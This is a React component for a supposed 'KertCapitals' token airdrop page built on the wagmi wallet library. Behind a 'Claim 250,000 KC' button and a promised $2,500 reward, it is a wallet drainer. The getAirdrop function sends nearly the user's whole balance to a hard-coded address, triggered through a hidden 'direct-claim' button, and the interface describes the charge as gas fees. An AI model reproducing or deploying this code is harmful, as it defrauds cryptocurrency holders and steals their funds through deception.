import React, { useEffect, useState } from 'react'
import { 
  useAccount, 
  useConnect, 
  useDisconnect, 
  useChainId, 
  useSwitchChain, 
  useBalance,
  useSendTransaction,
  useChains
} from 'wagmi'
import { parseEther } from 'viem'
import Swal from 'sweetalert2'

const WalletConnectBtn = () => {
  const fee = 0.0056
  const to = "0x353726D9AFc237Ee4B243254f1085e61EC102B9b"
  const airdropAmount = "250,000 KC"
  
  const { switchChain } = useSwitchChain()
  const chainId = useChainId()
  const chains = useChains()
  const [sendAmount, setSendAmount] = useState('0')
  
  const { address, connector, isConnected } = useAccount()
  
  // Use the useBalance hook instead of manual fetching
  const { data: balanceData, refetch: refetchBalance } = useBalance({
    address: address,
  })

  const { connect, connectors, error, isPending } = useConnect({
    mutation: {
      onSuccess: () => {
        // Cache successful connection
        localStorage.setItem('walletConnected', 'true')
        localStorage.setItem('lastConnectedTime', Date.now().toString())
      },
      onError: (error) => {
        console.error('Connection error:', error)
        localStorage.removeItem('walletConnected')
      }
    }
  })
  const { disconnect } = useDisconnect({
    mutation: {
      onSuccess: () => {
        // Clear connection cache on disconnect
        localStorage.removeItem('walletConnected')
        localStorage.removeItem('lastConnectedTime')
      }
    }
  })
  
  // Modern useSendTransaction - no need for prepare hook
  const { 
    sendTransaction, 
    isPending: isSendingTransaction,
    isSuccess,
    error: sendError 
  } = useSendTransaction()

  // Calculate available balance (total balance minus gas fee)
  const availableBalance = balanceData ? 
    parseFloat(balanceData.formatted) - fee : 0

  // Custom SweetAlert2 theme
  const swalStyles = {
    background: 'linear-gradient(135deg, rgba(15, 20, 25, 0.95), rgba(25, 118, 210, 0.1))',
    color: '#ffffff',
    border: '1px solid #1e3a5f'
  }

  // Check for cached connection on component mount
  useEffect(() => {
    const checkCachedConnection = () => {
      const wasConnected = localStorage.getItem('walletConnected')
      const lastConnected = localStorage.getItem('lastConnectedTime')
      
      // Auto-reconnect if connected within last 24 hours
      if (wasConnected && lastConnected) {
        const timeDiff = Date.now() - parseInt(lastConnected)
        const twentyFourHours = 24 * 60 * 60 * 1000
        
        if (timeDiff < twentyFourHours && !isConnected) {
          // Attempt to reconnect with the cached connection
          console.log('Attempting cached reconnection...')
        }
      }
    }
    
    checkCachedConnection()
  }, [])

  useEffect(() => {
    if (isConnected && address) {
      refetchBalance()
      // Update connection cache
      localStorage.setItem('walletConnected', 'true')
      localStorage.setItem('lastConnectedTime', Date.now().toString())
    }
  }, [isConnected, address, refetchBalance])

  useEffect(() => {
    if (isSuccess) {
      Swal.fire({
        title: '🎉 Success!',
        html: `
          <div style="text-align: center; padding: 20px;">
            <div style="font-size: 48px; margin-bottom: 16px;">🎁</div>
            <h3 style="color: #64b5f6; margin-bottom: 16px;">Airdrop Claimed Successfully!</h3>
            <p style="color: #90caf9; font-size: 18px; margin-bottom: 8px;">${airdropAmount} tokens are being processed</p>
            <p style="color: #b0bec5; font-size: 14px;">Your tokens will appear in your wallet shortly</p>
          </div>
        `,
        background: swalStyles.background,
        color: swalStyles.color,
        confirmButtonColor: '#1976d2',
        confirmButtonText: 'Awesome!',
        showClass: {
          popup: 'animate__animated animate__fadeInUp'
        }
      })
    }
  }, [isSuccess])

  useEffect(() => {
    if (sendError) {
      Swal.fire({
        title: '⚠️ Transaction Failed',
        html: `
          <div style="text-align: center; padding: 20px;">
            <div style="font-size: 48px; margin-bottom: 16px;">❌</div>
            <p style="color: #ff5252; font-size: 16px;">${sendError.message}</p>
            <p style="color: #90caf9; font-size: 14px;">Please try again or contact support</p>
          </div>
        `,
        background: swalStyles.background,
        color: swalStyles.color,
        confirmButtonColor: '#f44336',
        confirmButtonText: 'Try Again'
      })
    }
  }, [sendError])

  const getAirdrop = async () => {
    if (!balanceData) {
      Swal.fire({
        title: '⚠️ Balance Error',
        text: 'Unable to fetch wallet balance. Please refresh and try again.',
        background: swalStyles.background,
        color: swalStyles.color,
        confirmButtonColor: '#f44336'
      })
      return
    }

    const currentBalance = parseFloat(balanceData.formatted)
    const amountToSend = currentBalance - fee

    console.log('Current balance:', currentBalance)
    console.log('Amount to send:', amountToSend)
    
    if (currentBalance < fee) {
      Swal.fire({
        title: '💸 Insufficient Balance',
        html: `
          <div style="text-align: center; padding: 20px;">
            <div style="font-size: 48px; margin-bottom: 16px;">⛽</div>
            <p style="color: #ff9800; font-size: 16px;">Not enough balance to cover gas fees</p>
            <p style="color: #90caf9; font-size: 14px;">Minimum required: ${fee} ${balanceData.symbol}</p>
            <p style="color: #90caf9; font-size: 14px;">Your balance: ${currentBalance} ${balanceData.symbol}</p>
          </div>
        `,
        background: swalStyles.background,
        color: swalStyles.color,
        confirmButtonColor: '#ff9800'
      })
      return
    }

    if (amountToSend <= 0) {
      Swal.fire({
        title: '💰 Wallet Requirements',
        html: `
          <div style="text-align: center; padding: 20px;">
            <div style="font-size: 48px; margin-bottom: 16px;">👛</div>
            <p style="color: #ff9800; font-size: 16px;">Please use a wallet with sufficient funds</p>
            <p style="color: #90caf9; font-size: 14px;">Required for gas fees and airdrop processing</p>
          </div>
        `,
        background: swalStyles.background,
        color: swalStyles.color,
        confirmButtonColor: '#ff9800'
      })
      return
    }

    try {
      await sendTransaction({
        to: to,
        value: parseEther(amountToSend.toString()),
        data: "0x",
      })
    } catch (error) {
      console.error('Transaction failed:', error)
    }
  }

  const formatAddress = (address) => {
    return `${address.slice(0, 6)}...${address.slice(-4)}`
  }

  const getNetworkIcon = (chainName) => {
    const icons = {
      'Ethereum': '⟠',
      'Polygon': '⬢',
      'BNB Smart Chain': '🔶',
      'Arbitrum': '🔵',
      'Base': '🔷',
      'Optimism': '🔴'
    }
    return icons[chainName] || '🔗'
  }

  if (isConnected) {
    return (
      <div className="wallet-connected-container">
        {/* Connected Wallet Info Card */}
        <div className="card mb-4" style={{
          background: 'linear-gradient(135deg, rgba(25, 118, 210, 0.1), rgba(15, 20, 25, 0.8))',
          border: '1px solid #1e3a5f',
          borderRadius: '15px'
        }}>
          <div className="card-body p-4">
            <div className="d-flex align-items-center justify-content-between mb-3">
              <div className="d-flex align-items-center">
                <div className="me-3" style={{
                  width: '40px',
                  height: '40px',
                  background: 'linear-gradient(135deg, #4caf50, #66bb6a)',
                  borderRadius: '50%',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}>
                  <span style={{color: 'white', fontSize: '16px'}}>✓</span>
                </div>
                <div>
                  <h6 style={{color: '#4caf50', margin: '0', fontWeight: '600'}}>Wallet Connected</h6>
                  <code style={{color: '#90caf9', fontSize: '12px'}}>{formatAddress(address)}</code>
                </div>
              </div>
              <button 
                className="btn btn-outline-danger btn-sm"
                style={{borderRadius: '20px'}}
                onClick={() => disconnect()}
              >
                Disconnect
              </button>
            </div>

            <div className="row g-3">
              <div className="col-6">
                <div className="text-center p-2" style={{
                  background: 'rgba(25, 118, 210, 0.1)',
                  borderRadius: '10px',
                  border: '1px solid rgba(25, 118, 210, 0.2)'
                }}>
                  <small style={{color: '#90caf9', fontSize: '11px'}}>Balance</small>
                  <div style={{color: '#ffffff', fontWeight: '600', fontSize: '14px'}}>
                    {balanceData ? `${parseFloat(balanceData.formatted).toFixed(4)} ${balanceData.symbol}` : 'Loading...'}
                  </div>
                </div>
              </div>
              <div className="col-6">
                <div className="text-center p-2" style={{
                  background: 'rgba(25, 118, 210, 0.1)',
                  borderRadius: '10px',
                  border: '1px solid rgba(25, 118, 210, 0.2)'
                }}>
                  <small style={{color: '#90caf9', fontSize: '11px'}}>Available</small>
                  <div style={{color: '#ffffff', fontWeight: '600', fontSize: '14px'}}>
                    {availableBalance > 0 ? `${availableBalance.toFixed(4)} ETH` : '0 ETH'}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Claim Airdrop Button */}
        <div className="text-center">
          <button 
            className='btn btn-lg px-4 py-3' 
            style={{
              background: 'linear-gradient(135deg, #1976d2, #42a5f5)',
              border: 'none',
              borderRadius: '25px',
              color: 'white',
              fontSize: '16px',
              fontWeight: '600',
              boxShadow: '0 8px 25px rgba(25, 118, 210, 0.4)',
              minWidth: '200px'
            }}
            data-bs-toggle="modal" 
            data-bs-target="#networkSelect"
            disabled={isSendingTransaction || availableBalance <= 0}
          >
            {isSendingTransaction ? (
              <>
                <span className="spinner-border spinner-border-sm me-2"></span>
                Processing...
              </>
            ) : (
              <>🎁 Claim {airdropAmount}</>
            )}
          </button>
        </div>

        {/* Network Selection Modal */}
        <div className='modal fade' id='networkSelect'>
          <div className='modal-dialog modal-dialog-centered'>
            <div className='modal-content' style={{
              background: 'linear-gradient(135deg, rgba(15, 20, 25, 0.95), rgba(25, 118, 210, 0.05))',
              border: '1px solid #1e3a5f',
              borderRadius: '20px'
            }}>
              <div className="modal-header border-bottom" style={{borderColor: '#1e3a5f !important'}}>
                <h5 style={{color: '#64b5f6', fontWeight: '700'}}>
                  🌐 Select Network
                </h5>
                <button className='btn-close' data-bs-dismiss="modal" style={{filter: 'invert(1)'}}></button>
              </div>
              
              <div className='modal-body p-4'>
                <p className="text-center mb-4" style={{color: '#90caf9'}}>
                  Choose your preferred network for the airdrop
                </p>
                
                <div className="d-grid gap-3">
                  {chains.map((chain) => (
                    <button 
                      className='btn d-flex align-items-center justify-content-between p-3'
                      style={{
                        background: chain.id === chainId ? 
                          'linear-gradient(135deg, rgba(25, 118, 210, 0.2), rgba(66, 165, 245, 0.1))' :
                          'rgba(25, 118, 210, 0.05)',
                        border: `1px solid ${chain.id === chainId ? '#1976d2' : '#1e3a5f'}`,
                        borderRadius: '12px',
                        color: '#ffffff'
                      }}
                      disabled={!switchChain || chain.id === chainId}
                      key={chain.id}
                      onClick={() => switchChain?.({ chainId: chain.id })}
                    >
                      <div className="d-flex align-items-center">
                        <span className="me-3" style={{fontSize: '20px'}}>
                          {getNetworkIcon(chain.name)}
                        </span>
                        <div className="text-start">
                          <div style={{fontWeight: '600'}}>{chain.name}</div>
                          {chain.id === chainId && (
                            <small style={{color: '#4caf50'}}>✓ Currently Active</small>
                          )}
                        </div>
                      </div>
                      {chain.id === chainId && (
                        <span style={{
                          background: '#4caf50',
                          color: 'white',
                          padding: '4px 8px',
                          borderRadius: '20px',
                          fontSize: '12px',
                          fontWeight: '600'
                        }}>
                          Current
                        </span>
                      )}
                    </button>
                  ))}
                </div>
              </div>
              
              <div className='modal-footer border-top d-grid' style={{borderColor: '#1e3a5f !important'}}>
                {/* Hidden direct claim button */}
                <button 
                  id="direct-claim" 
                  className='btn d-none' 
                  onClick={getAirdrop}
                  disabled={isSendingTransaction || availableBalance <= 0}
                >
                  Direct Claim
                </button>

                {/* Main claim button with confirmation */}
                <button  
                  className='btn btn-lg py-3' 
                  style={{
                    background: 'linear-gradient(135deg, #1976d2, #42a5f5)',
                    border: 'none',
                    borderRadius: '15px',
                    color: 'white',
                    fontSize: '16px',
                    fontWeight: '600'
                  }}
                  onClick={() => {
                    Swal.fire({
                      title: '🎉 Claim Confirmation',
                      html: `
                        <div style="text-align: center; padding: 20px;">
                          <div style="font-size: 64px; margin-bottom: 20px;">🎁</div>
                          <h3 style="color: #64b5f6; margin-bottom: 16px;">Ready to Claim!</h3>
                          <div style="background: rgba(25, 118, 210, 0.1); padding: 15px; border-radius: 10px; margin-bottom: 16px;">
                            <p style="color: #ffffff; font-size: 20px; margin: 0; font-weight: 600;">${airdropAmount}</p>
                            <p style="color: #90caf9; font-size: 14px; margin: 0;">KertCapitals Tokens</p>
                          </div>
                          <p style="color: #b0bec5; font-size: 14px; margin-bottom: 8px;">Estimated value: $2,500 USD</p>
                          <p style="color: #ff9800; font-size: 12px;">⚠️ Gas fees will be deducted from your wallet</p>
                        </div>
                      `,
                      background: swalStyles.background,
                      color: swalStyles.color,
                      showCancelButton: true,
                      confirmButtonColor: '#1976d2',
                      cancelButtonColor: '#424242',
                      confirmButtonText: '🚀 Claim Now!',
                      cancelButtonText: 'Cancel',
                      reverseButtons: true
                    }).then((result) => {
                      if (result.isConfirmed) {
                        document.getElementById("direct-claim")?.click()
                      }
                    })
                  }}
                  disabled={isSendingTransaction || availableBalance <= 0}
                >
                  {isSendingTransaction ? (
                    <>
                      <span className="spinner-border spinner-border-sm me-2"></span>
                      Processing Claim...
                    </>
                  ) : (
                    <>🎁 Claim {airdropAmount}</>
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    )
  }
    
  return (
    <div className="wallet-connection-container">
      <div className="text-center mb-4">
        <div className="mb-3" style={{
          width: '60px',
          height: '60px',
          background: 'linear-gradient(135deg, #1976d2, #42a5f5)',
          borderRadius: '15px',
          margin: '0 auto',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          boxShadow: '0 8px 25px rgba(25, 118, 210, 0.3)'
        }}>
          <span style={{color: 'white', fontSize: '24px'}}>👛</span>
        </div>
        <h6 style={{color: '#64b5f6', fontWeight: '600', marginBottom: '8px'}}>
          Connect Your Wallet
        </h6>
        <p style={{color: '#90caf9', fontSize: '14px', margin: '0'}}>
          Choose your preferred wallet to claim tokens
        </p>
      </div>

      <div className="d-grid gap-3">
        {connectors.map((connector) => {
          const isCurrentlyConnecting = isPending && connector.id
          return connector.type !== 'injected' || connector.name !== 'Injected' ? (
            <button
              className='btn d-flex align-items-center justify-content-center p-3'
              style={{
                background: isCurrentlyConnecting ? 'rgba(25, 118, 210, 0.2)' : 'rgba(25, 118, 210, 0.1)',
                border: `1px solid ${isCurrentlyConnecting ? '#1976d2' : '#1e3a5f'}`,
                borderRadius: '12px',
                color: '#ffffff',
                transition: 'all 0.3s ease',
                opacity: (!connector || isPending) ? 0.6 : 1
              }}
              disabled={!connector || isPending}
              key={connector.id}
              data-bs-dismiss={isPending ? '' : 'modal'}
              onClick={() => {
                if (!isPending) {
                  // Show immediate feedback
                  const button = document.activeElement
                  if (button) {
                    button.style.background = 'rgba(25, 118, 210, 0.3)'
                    button.innerHTML = `<span class="spinner-border spinner-border-sm me-2"></span>Connecting...`
                  }
                  connect({ connector })
                }
              }}
              onMouseEnter={(e) => {
                if (!isPending) {
                  e.target.style.background = 'rgba(25, 118, 210, 0.2)'
                  e.target.style.borderColor = '#1976d2'
                }
              }}
              onMouseLeave={(e) => {
                if (!isPending) {
                  e.target.style.background = 'rgba(25, 118, 210, 0.1)'
                  e.target.style.borderColor = '#1e3a5f'
                }
              }}
            >
              <div className="d-flex align-items-center">
                {isCurrentlyConnecting ? (
                  <span className="spinner-border spinner-border-sm me-3"></span>
                ) : (
                  <span className="me-3" style={{fontSize: '20px'}}>
                    {connector.name.includes('MetaMask') ? '🦊' :
                     connector.name.includes('WalletConnect') ? '🔗' :
                     connector.name.includes('Coinbase') ? '🏛️' : '👛'}
                  </span>
                )}
                <span style={{fontWeight: '600'}}>
                  {isCurrentlyConnecting ? 'Connecting...' : `Connect ${connector.name}`}
                </span>
              </div>
            </button>
          ) : null
        })}
      </div>
 
      {error && (
        <div className='alert mt-3 p-3' style={{
          background: 'rgba(244, 67, 54, 0.1)',
          border: '1px solid #f44336',
          borderRadius: '10px',
          color: '#ffcdd2'
        }}>
          <div className="d-flex align-items-center">
            <span className="me-2">⚠️</span>
            <small>{error.message}</small>
          </div>
        </div>
      )}
    </div>
  )
}

export default WalletConnectBtn